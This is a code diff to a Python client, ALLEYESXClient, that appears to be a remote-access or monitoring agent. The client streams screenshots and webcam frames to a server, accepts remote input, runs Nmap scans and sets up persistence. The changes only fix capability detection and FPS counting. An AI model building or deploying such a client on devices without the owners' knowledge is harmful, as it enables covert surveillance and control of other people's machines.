@@ -177,6 +177,9 @@ def capability_profile():
     can_webcam = have('cv2')
     can_input = have('pyautogui')
     can_telemetry = have('psutil')
+    # The platform alone does not mean Nmap is installed. The scanner itself
+    # uses shutil.which('nmap'), so advertise the same actual prerequisite.
+    can_nmap = kind in ('windows', 'linux', 'macos', 'android') and bool(shutil.which('nmap'))
 
     missing = []
     if not can_telemetry:
@@ -190,6 +193,8 @@ def capability_profile():
         missing.append('opencv-python (webcam)')
     if not can_input:
         missing.append('pyautogui pynput (remote input)')
+    if not can_nmap and kind in ('windows', 'linux', 'macos', 'android'):
+        missing.append('nmap executable on PATH (network scans)')
 
     limited = 'iOS sandbox restrictions' if kind == 'ios' else ''
     if missing:
@@ -205,7 +210,7 @@ def capability_profile():
         'remote_input': can_input and kind in ('windows', 'linux', 'macos'),
         'persistence': (kind in ('windows', 'linux', 'macos'))
         or (kind == 'android' and os.path.isdir(os.path.expanduser('~/.termux/boot'))),
-        'nmap': kind in ('windows', 'linux', 'macos', 'android'),
+        'nmap': can_nmap,
         'missing': missing,
         'limited_reason': limited,
     }
@@ -3589,34 +3594,39 @@ class ALLEYESXClient:
             pass
 
     def send_screenshot(self):
+        """Return True only when a captured frame was acknowledged by the server."""
         now = time.time()
         if now - self.last_screenshot_time < SCREENSHOT_INTERVAL:
-            return
+            return False
         self.last_screenshot_time = now
-        
+
         try:
             result = capture_screenshot()
             if result is None:
-                return
-            api_request_raw(f'/api/screenshot/{self.device_id}', result)
-        except:
-            pass
+                return False
+            response = api_request_raw(f'/api/screenshot/{self.device_id}', result)
+            return isinstance(response, dict) and response.get('status') == 'ok'
+        except Exception:
+            return False
 
     def send_webcam(self):
+        """Return True only when a captured frame was acknowledged by the server."""
         if not self.webcam_enabled:
-            return
+            return False
         now = time.time()
         if now - self.last_webcam_time < WEBCAM_INTERVAL:
-            return
+            return False
         self.last_webcam_time = now
 
         try:
             image_b64 = capture_webcam(camera=self.webcam_camera)
             if image_b64:
-                api_request_raw(f'/api/webcam/{self.device_id}', {'image': image_b64})
+                response = api_request_raw(f'/api/webcam/{self.device_id}', {'image': image_b64})
+                return isinstance(response, dict) and response.get('status') == 'ok'
         except Exception as e:
             print(f"[-] Webcam capture failed: {e}")
             self.webcam_enabled = False
+        return False
 
     def apply_webcam_command(self, task):
         """Handle start / stop / switch delivered over the heartbeat queue."""
@@ -3693,22 +3703,21 @@ class ALLEYESXClient:
                 
                 self.heartbeat()
                 self.poll_touch_events()
-                self.send_screenshot()
-                self.send_webcam()
+                # Count acknowledged frames, not loop iterations. Disabled
+                # cameras and failed/unchanged captures must not display FPS.
+                screenshot_counter += int(self.send_screenshot())
+                webcam_counter += int(self.send_webcam())
                 self.send_hardware_inventory()
                 self.send_software_inventory()
                 self.send_network_flows()
                 self.send_network_links()
                 self.send_log_events()
                 
-                screenshot_counter += 1
-                webcam_counter += 1
-                
                 now = time.time()
                 if now - fps_timer >= 5:
                     screen_fps = screenshot_counter / (now - fps_timer)
                     cam_fps = webcam_counter / (now - fps_timer)
-                    print(f"[*] Screen: {screen_fps:.1f} FPS | Webcam: {cam_fps:.1f} FPS")
+                    print(f"[*] Acknowledged frames — Screen: {screen_fps:.1f} FPS | Webcam: {cam_fps:.1f} FPS")
                     screenshot_counter = 0
                     webcam_counter = 0
                     fps_timer = now
